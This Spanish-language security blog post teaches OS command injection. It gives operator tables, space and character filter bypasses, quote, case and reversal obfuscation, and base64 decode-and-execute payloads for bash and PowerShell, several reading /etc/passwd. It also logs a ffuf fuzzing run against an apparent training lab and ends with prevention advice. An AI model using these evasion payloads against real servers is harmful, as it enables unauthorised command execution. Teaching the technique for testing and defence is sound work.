---
date: 2025-09-26T02:31:05.000Z
layout: post
comments: true
title: "Command Injections"
subtitle: 'ejecución de comandos en el sistema'
description: >-
image: >-
  https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/commandlogo.png
optimized_image: >-
  https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/commandlogo.png
category: ciberseguridad
tags:
  - web
  - rce
  - owasp
  - php
author: Felipe Canales Cayuqueo
paginate: true
---

Un **Command Injection** (inyección de comandos) es una vulnerabilidad que ocurre cuando una aplicación web permite que el usuario introduzca datos que luego se utilizan directamente en comandos del **sistema operativo**, sin la validación o filtrado adecuados.  

Esto significa que un atacante puede **inyectar sus propios comandos** dentro de la aplicación y lograr que el servidor los ejecute.  
De esta forma, es posible obtener información sensible, manipular archivos, ejecutar programas instalados o incluso tomar control completo del sistema.  

### Operadores comunes en Command Injection  

| Operador de inyección     | Carácter | URL-Encoded | Comando ejecutado | Ejemplo de inyección              |
|----------------------------|----------|-------------|-------------------|-----------------------------------|
| Punto y coma (Semicolon)  | `;`      | `%3b`       | Ambos comandos    | `127.0.0.1; ls -la`               |
| Nueva línea (New Line)    | `\n`     | `%0a`       | Ambos comandos    | `127.0.0.1%0a whoami`              |
| Segundo plano (Background)| `&`      | `%26`       | Ambos (segundo suele mostrarse primero) | `127.0.0.1 & id` |
| Pipe (Tubería)            | `|`     | `%7c`       | Solo el segundo (se muestra su salida) | `127.0.0.1 | uname -a` |
| AND lógico                | `&&`     | `%26%26`    | Ambos (solo si el primero tiene éxito) | `127.0.0.1 && cat /etc/passwd` |
| OR lógico                 | `||`   | `%7c%7c`    | Segundo (solo si el primero falla) | `test || echo vulnerable` |
| Sub-Shell (backticks)     | `` ` `` `` ` ``  | `%60%60`    | Ambos (Linux)     | `` 127.0.0.1 `whoami` ``          |
| Sub-Shell `$()`           | `$()`   | `%24%28%29` | Ambos (Linux)     | `127.0.0.1 $(id)`                 |

#### Ejemplo 

A continuación se presenta un caso en que ocupamos el primer operador de la tabla y obtenemos éxito al capturar la petición por BurpSuite.

[![command1](/images/command1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/command1.png)

Al detectar el posible vector de ataque simplemente lo agregamos de la siguiente forma.

[![command2](/images/command2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/command2.png)

Este mismo procedimiento se puede realizar con cada uno de los operadores de la tabla.

### Bypass de los filtros de espacios

En muchos entornos de seguridad, el carácter de **espacio** (`" "`) se encuentra en listas negras para impedir la ejecución de comandos. Sin embargo, existen diferentes técnicas para evadir esta restricción y seguir inyectando. A continuación se presentan ejemplos:

| Técnica         | Descripción | Ejemplo |
|-----------------|-------------|---------|
| **`%0a`** (salto de línea) | El salto de línea puede separar comandos o argumentos. | `127.0.0.1%0als` |
| **`%0a+`** (salto de línea + espacio) | Combina newline con un espacio, útil contra algunos WAF. | `127.0.0.1%0a+ls` |
| **`%09`** (tabulación) | Sustituye el espacio por una tabulación; shells suelen aceptarlo entre argumentos. | `cat%09/etc/passwd` |
| **`${IFS}`** (Internal Field Separator) | Variable de entorno en Linux que equivale a espacio, tab y newline. | `cat${IFS}/etc/passwd` |
| **`{ls,-la}`** | Expansión de llaves en bash para separar argumentos sin usar espacio explícito. | `{ls,-la}` → `ls -la` |
| **`>`** (redirección) | Redirige salida a un archivo; no reemplaza espacios, pero sirve como bypass adicional. | `id > /tmp/out.txt` |

#### Ejemplo

A continuación se muestra el uso de la evasión de filtros de espacios.

[![command3](/images/command3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/command3.png)


### Bypass de caracteres prohibidos usando variables de entorno  

Cuando un filtro bloquea caracteres como `/` o `;`, podemos usar **variables de entorno en Linux** para reconstruirlos de forma indirecta (se pueden consultar con el comando `printenv`).  
Al igual que `${IFS}` sirve como espacio, otras variables (ej. `$PATH`, `$HOME`, `$PWD`, `$LS_COLORS`) contienen estos símbolos en su valor.  

Con la sintaxis `${VAR:inicio:longitud}`, podemos extraer solo un carácter de esa variable y usarlo en nuestro payload.  

Por ejemplo tenemos los siguientes:

* `${PATH:0:1}` → `/`
* `${LS_COLORS:10:1}` → `;`

En Windows se puede usar el mismo truco que en Linux: **extraer caracteres desde variables de entorno** (se pueden consultar con el comando `Get-ChildItem Env:`).

- **CMD**: se usa la sintaxis `:~inicio,longitud` para recortar variables.  
  Ejemplo:  
  ```cmd
  echo %HOMEPATH:~6,-11% ➝ Devuelve \
   ```
 
- **PowerShell**: cada variable es un array de caracteres, basta con indicar la posición.  
Ejemplo:  
   ```
   $env:HOMEPATH[0] ➝ Devuelve \
   ```   

Otra técnica para evadir filtros es el **shifting**, donde se transforma un carácter en otro.  
El truco: buscar en la tabla ASCII el carácter **anterior** al que necesitamos y dejar que el comando lo desplace (consulte ```man ascii```).  

Ejemplo en Linux para obtener `\` (ASCII 92, justo después de `[` que es 91):  

```
echo $(tr '!-}' '"-~'<<<[)
```


#### Ejemplo

Realizamos un ataque por fuzzing con el modo clusterbomb de ffuf usando el siguiente diccionario:

```
┌──(root㉿nptg)-[/injection]
└─# cat space.txt   
%0a
%0a+
%09
${IFS}
>
```

En donde los parámetros a los que se les realizará fuzzing serán asignados con las variables ```FUZZA``` y ```FUZZB```, considerando que usaremos para definir el directorio ```/home``` como ```${PATH:0:1}home```.

[![command4](/images/command4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/command4.png)

Tras realizar el fuzzing se detectaron 3 posibles evasiones válidas.

```
┌──(root㉿nptg)-[/injection]
└─# ffuf -mode clusterbomb -request request.txt -u http://94.237.57.211:55908/ -w space.txt:FUZZA -w space.txt:FUZZB -fs 635,648   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.57.211:55908/
 :: Wordlist         : FUZZA: /home/nptg/Documentos/HTB/Academy/CBBH/space.txt
 :: Wordlist         : FUZZB: /home/nptg/Documentos/HTB/Academy/CBBH/space.txt
 :: Header           : Cache-Control: max-age=0
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: keep-alive
 :: Header           : Host: 94.237.57.211:55908
 :: Header           : Origin: http://94.237.57.211:55908
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 :: Header           : Referer: http://94.237.57.211:55908/
 :: Header           : Accept-Language: es,es-ES;q=0.9,en;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
 :: Header           : Cookie: PHPSESSID=foln9nueoba552uf6n3ge7mncn
 :: Data             : ip=127.0.0.1FUZZA{ls,-la}FUZZB${PATH:0:1}home
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 635,648
________________________________________________

[Status: 200, Size: 1116, Words: 141, Lines: 42, Duration: 190ms]
    * FUZZA: %0a
    * FUZZB: %0a

[Status: 200, Size: 1056, Words: 147, Lines: 41, Duration: 189ms]
    * FUZZA: %0a
    * FUZZB: %09

[Status: 200, Size: 1241, Words: 190, Lines: 48, Duration: 1265ms]
    * FUZZA: %0a
    * FUZZB: ${IFS}

```

Tras validarlo encontramos que al menos dos de ellas son correctos.

[![command5](/images/command5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/command4.png)


### Bypass de comandos en listas negras

Algunas aplicaciones bloquean directamente comandos peligrosos (`whoami`, `cat`, etc.) mediante listas negras.  
Estos filtros suelen ser muy básicos y buscan la palabra exacta, lo que permite evadirlos usando **obfuscación**: cambiar la forma en que se escribe el comando sin alterar su ejecución.

---

#### 1. Linux y Windows: uso de comillas `'` o `"`

Los intérpretes (Bash, PowerShell, CMD) suelen **ignorar comillas** dentro de un comando, siempre que estén balanceadas.  
Por eso, podemos dividir el comando con comillas y seguirá funcionando.

Ejemplos:  

    w'h'o'am'i
    w"h"o"am"i

> Nota: no mezclar tipos de comillas y deben usarse en número par.  

> Nota 2: en el segundo ejemplo `am` va junto porque se pueden insertar comillas en cualquier punto, no es necesario hacerlo carácter por carácter.

---

#### 2. Linux: caracteres especiales

En Linux, Bash también ignora otros caracteres al interpretar comandos:  

    w\ho\am\i
    who$@ami
  

---

#### 3. Windows: carácter especial

En Windows CMD se puede usar el **caret `^`** para romper un comando sin cambiar el resultado:  

    who^ami

---

#### 4. Concatenación con variables vacías
  En Linux se pueden usar variables no definidas para partir comandos:  

      wh${X}oami  

  Si `X` no existe, se interpreta igual que `whoami`.


---

#### Ejemplo

```
ip=127.0.0.1%0ac'a't%09${PATH:0:1}etc${PATH:0:1}passwd

## Esto sería igual a cat /etc/passwd
```

### Ofuscación de comandos

#### Manipulación de caracteres

Esto permite evadir un filtro que bloquee la palabra exacta whoami, ya que se envía una variante (WhOaMi) y se transforma en minúsculas antes de ejecutarse.

* En Windows:
    ```
    PS C:\> WhOaMi
    ```

* En Linux:
    ```
    $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
    ```

    ```
    $(a="WhOaMi";printf %s "${a,,}")
    ```

#### Comandos invertidos

Esto funciona porque el **shell interpreta el resultado de un subshell como un comando válido**.

* En Windows:
    ```
    "whoami"[-1..-20] -join ''
    ```
* En Linux:
    ```
    $(rev<<<'imaohw')
    ```

#### Comandos codificados

A veces, cuando intentamos inyectar un comando en una aplicación vulnerable nos topamos con filtros que bloquean ciertos caracteres (`|`, espacios, etc.) o incluso palabras completas (`whoami`, `cat`). El problema es que el comando llega "roto" al sistema y no se ejecuta.  

La idea es Codificar el comando en otro formato (base64, hex, etc.), y luego decodificarlo y ejecutarlo dentro del servidor.

#### Ejemplo en Linux

1. Tomamos el comando original (ej: `cat /etc/passwd | grep 33`) y lo codificamos en base64:  
    ```
    echo -n 'cat /etc/passwd | grep 33' | base64
    ```
    Resultado:  
    ```
    Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
    ```

2. Ahora, en lugar de enviar el comando original, enviamos uno que **decodifica y ejecuta**:  
    ```
    bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
    ```
    - `base64 -d` decodifica.  
    - `$()` ejecuta lo decodificado.  
    - `bash<<<` pasa el resultado directamente al shell.  

El servidor corre el comando original sin que los filtros lo detecten, porque nunca apareció "escrito tal cual".

#### Ejemplo en Windows

En PowerShell se hace parecido, pero con sus propios métodos:  

1. Codificamos en base64 el comando `whoami`:  
    ```
    [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
    ```
    Resultado:  
    ```
    dwBoAG8AYQBtAGkA
    ```

2. Lo decodificamos y ejecutamos dinámicamente:  
    ```
    iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
    ```
    - `FromBase64String` decodifica.  
    - `GetString` lo convierte de bytes a texto.  
    - `iex` (`Invoke-Expression`) ejecuta la cadena como comando.  


#### ¿Por qué funciona?

- Porque los **filtros buscan palabras exactas o caracteres específicos**.  
- Al mandar el comando **codificado**, el filtro nunca ve la palabra prohibida (`whoami`, `cat`, etc.).  
- El shell del servidor decodifica y ejecuta el comando original sin problemas.  


#### Bonus

- Si bloquean `bash`, se puede usar `sh`.  
- Si bloquean `base64`, se puede usar `xxd`, `openssl` u otros métodos de encoding.  
- Se puede mezclar con otras técnicas de **ofuscación de caracteres** para hacerlo aún más difícil de detectar.


### Recomendaciones técnicas para prevenir Command Injection

1. **Evitar el uso directo del sistema**  
   - No ejecutar comandos del sistema operativo desde la aplicación siempre que sea posible.  
   - Usar funciones o librerías nativas que reemplacen la necesidad de comandos externos (ej: APIs en lugar de `ping` o `cat`).  

2. **Validación estricta de entradas (front-end y back-end)**  
   - Nunca confiar en la validación solo en el cliente. Todo dato debe ser validado también en el servidor.  
   - **PHP**: usar filtros nativos como `filter_var()` para validar formatos estándar (IP, emails, URL, etc.):  
     ```php
     if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
         // call function
     } else {
         // deny request
     }
     ```
   - **Regex personalizada**: cuando el formato no es estándar, usar expresiones regulares.  
     Ejemplo en JavaScript:  
     ```javascript
     if(/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)){
         // call function
     } else {
         // deny request
     }
     ```
   - **NodeJS**: existen librerías como `is-ip` que facilitan la validación:  
     ```javascript
     const isIp = require('is-ip');
     if (isIp(ip)) {
         // call function
     } else {
         // deny request
     }
     ```
   - En otros lenguajes (.NET, Java, etc.), revisar librerías estándar de validación para formatos de entrada.

3. **Escape y sanitización**  
   - Si inevitablemente se va a usar la entrada en un comando, escapar correctamente los caracteres especiales.  
   - PHP → `escapeshellcmd()` o `escapeshellarg()`.  
   - Python → `shlex.quote()`.  

4. **Uso de APIs seguras**  
   - Preferir funciones que no pasen por el intérprete de comandos.  
   - Ejemplo en Python:  
     ```python
     subprocess.run(["ls", "-la"])
     ```
     en lugar de  
     ```python
     os.system("ls -la")
     ```

5. **Principio de privilegios mínimos**  
   - Ejecutar la aplicación con un usuario de sistema restringido (nunca `root` o `Administrador`).  
   - De esta forma, si hay explotación, el impacto será limitado.

6. **Uso de WAF y RASP**  
   - Un **Web Application Firewall (WAF)** puede ayudar a filtrar patrones de explotación comunes.  
   - **Runtime Application Self-Protection (RASP)** protege en tiempo de ejecución dentro de la propia aplicación.
